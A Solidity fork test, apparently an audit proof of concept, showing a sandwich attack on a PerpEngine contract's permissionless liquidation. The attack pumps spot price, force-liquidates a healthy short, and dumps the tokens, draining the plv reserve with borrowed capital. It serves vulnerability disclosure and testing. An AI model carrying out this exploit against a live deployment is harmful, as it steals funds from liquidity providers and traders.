// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {PerpEngineForkTest} from "../PerpEngine.t.sol";
import {PerpEngine} from "../../cauldron/PerpEngine.sol";
import {IERC20Minimal} from "v4-core/src/interfaces/external/IERC20Minimal.sol";

/**
 * E1A — Permissionless liquidation buy-back has NO price band (band=0 on
 * MODE_LIQUIDATION, PerpEngine.sol:1660) and a budget that includes ALL of plv
 * (PerpEngine.sol:1696). The external `liquidate(id)` insolvency test falls back
 * to LIVE SPOT (`_liqTest` -> sp=_sqrtP(), :1581) because `_projSqrtP==0` off the
 * in-swap path. An attacker therefore, atomically with borrowed ETH:
 *   1. buys token to push spot up (front-run),
 *   2. calls liquidate() on a short now insolvent-at-inflated-spot, forcing a
 *      slippage-free market buy of `size` token sized up to plv,
 *   3. sells the token back (back-run), sandwiching the engine's forced buy.
 * plv is drained by `_absorbPlvLoss(cost-backing)` (PerpEngine.sol:1703).
 */
contract E1A_LiqBuyBackSandwich is PerpEngineForkTest {
    function _rawSell(uint256 tokenIn) internal returns (uint256 ethOut) {
        ethOut = abi.decode(pm.unlock(abi.encode(uint8(1), tokenIn)), (uint256));
    }

    struct R {
        uint256 plvBefore;
        uint256 plvAfter;
        bool healthyPrePush;
        bool cleared;
        int256 attackerNet;
    }

    function _run(uint256 pushEth) internal returns (R memory r) {
        vm.deal(trader, 5 ether);
        vm.prank(trader);
        uint256 id = perp.openShort{value: 0.02 ether}(2, 0, 0, 0.02 ether);

        try perp.liquidate(id) { r.healthyPrePush = false; }
        catch { r.healthyPrePush = true; }

        r.plvBefore = perp.plv();

        // Borrowed capital (flashloanable from the 21,218-ETH v4 PoolManager).
        vm.deal(address(this), pushEth + 10 ether);
        uint256 ethStart = address(this).balance;
        uint256 tokStart = IERC20Minimal(token).balanceOf(address(this));

        // 1. FRONT-RUN: push token price up.
        _buyToken(pushEth);
        uint256 tokBought = IERC20Minimal(token).balanceOf(address(this)) - tokStart;

        // 2. Force-liquidate the now insolvent-at-live-spot short. Permissionless.
        perp.liquidate(id);
        r.plvAfter = perp.plv();

        // 3. BACK-RUN: dump the tokens bought.
        if (tokBought > 0) _rawSell(tokBought);

        r.attackerNet = int256(address(this).balance) - int256(ethStart);
        (address t2,,,,,,,) = perp.positions(id);
        r.cleared = (t2 == address(0));
    }

    function test_liq_buyback_sandwich_drains_plv() public {
        vm.skip(!active);
        R memory r = _run(1 ether);
        emit log_named_uint("plv before (wei)", r.plvBefore);
        emit log_named_uint("plv after  (wei)", r.plvAfter);
        emit log_named_int("attacker net ETH (wei)", r.attackerNet);
        assertTrue(r.healthyPrePush, "short was healthy before the push");
        assertTrue(r.cleared, "short was force-liquidated after the push");
        assertLt(r.plvAfter, r.plvBefore, "plv drained by the band-less buy-back");
    }
}
